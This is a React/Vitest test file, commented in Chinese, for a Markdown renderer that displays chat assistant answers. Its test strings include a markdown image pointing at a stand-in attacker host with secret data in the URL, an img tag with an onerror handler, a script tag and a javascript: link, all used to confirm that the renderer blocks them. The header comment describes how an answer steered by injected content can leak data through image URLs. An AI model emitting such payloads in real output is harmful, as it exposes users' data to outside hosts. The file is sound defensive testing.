/**
 * MarkdownRenderer 的安全行為（回答顯示在畫面上時的最後一道）
 *
 * - 外部圖片一律不載入：瀏覽器一載入就等於連到外面，被惡意內容誘導的回答可以把資料帶在網址裡送出去
 * - 本機圖片（同一台伺服器、data:）照常顯示
 * - 外部連結在字的後面標出實際會連到的網站；站內連結不標；字裡已經寫出網站就不重複
 */

import { describe, expect, it, vi } from 'vitest'
import { render, screen } from '@testing-library/react'

vi.mock('@/i18n', () => ({
  default: { t: (key: string, vars?: Record<string, unknown>) => (vars?.alt ? `${key} ${vars.alt}` : key) },
}))

import MarkdownRenderer from '../MarkdownRenderer'

describe('MarkdownRenderer：圖片', () => {
  it('外部圖片不會變成 <img>，改顯示已封鎖的說明', () => {
    const { container } = render(<MarkdownRenderer content={'流程：![流程圖](https://evil.example/leak?data=secret)'} />)
    expect(container.querySelector('img')).toBeNull()
    expect(container.innerHTML).not.toContain('evil.example')
    expect(screen.getByText(/ui\.chat\.imageBlocked/)).toBeTruthy()
  })

  it('省略協定的外部圖片（//host/…）一樣不載入', () => {
    const { container } = render(<MarkdownRenderer content={'![x](//evil.example/a.png)'} />)
    expect(container.querySelector('img')).toBeNull()
  })

  it('本機圖片照常顯示', () => {
    const { container } = render(<MarkdownRenderer content={'![圖](/static/a.png)\n\n![點](data:image/png;base64,AAAA)'} />)
    const sources = [...container.querySelectorAll('img')].map((img) => img.getAttribute('src'))
    expect(sources).toEqual(['/static/a.png', 'data:image/png;base64,AAAA'])
  })

  it('回答裡的 HTML 不會被當成標籤執行', () => {
    const { container } = render(<MarkdownRenderer content={'<img src="https://evil.example/x.png" onerror="alert(1)"> <script>alert(1)</script>'} />)
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
  })
})

describe('MarkdownRenderer：連結', () => {
  it('外部連結標出實際的網站，並附上完整網址', () => {
    const { container } = render(<MarkdownRenderer content={'[點這裡看詳情](https://tracking.example.com/x?d=1)'} />)
    const link = container.querySelector('a') as HTMLAnchorElement
    expect(link.getAttribute('target')).toBe('_blank')
    expect(link.getAttribute('rel')).toContain('noopener')
    expect(link.querySelector('.md-link-host')?.textContent).toBe('tracking.example.com')
    expect(link.getAttribute('title')).toBe('https://tracking.example.com/x?d=1')
  })

  it('字裡已經寫出網站就不重複標', () => {
    const { container } = render(<MarkdownRenderer content={'[example.com 的教學](https://example.com/guide) 和 https://www.example.org/page'} />)
    expect(container.querySelectorAll('.md-link-host').length).toBe(0)
  })

  it('站內連結不標', () => {
    const { container } = render(<MarkdownRenderer content={'公司的[出差辦法](/docs/travel)'} />)
    expect(container.querySelector('a')).not.toBeNull()
    expect(container.querySelector('.md-link-host')).toBeNull()
  })

  it('javascript: 連結不會留下可執行的網址', () => {
    const { container } = render(<MarkdownRenderer content={'[按我](javascript:alert(1))'} />)
    const href = container.querySelector('a')?.getAttribute('href') || ''
    expect(href.startsWith('javascript:')).toBe(false)
  })
})
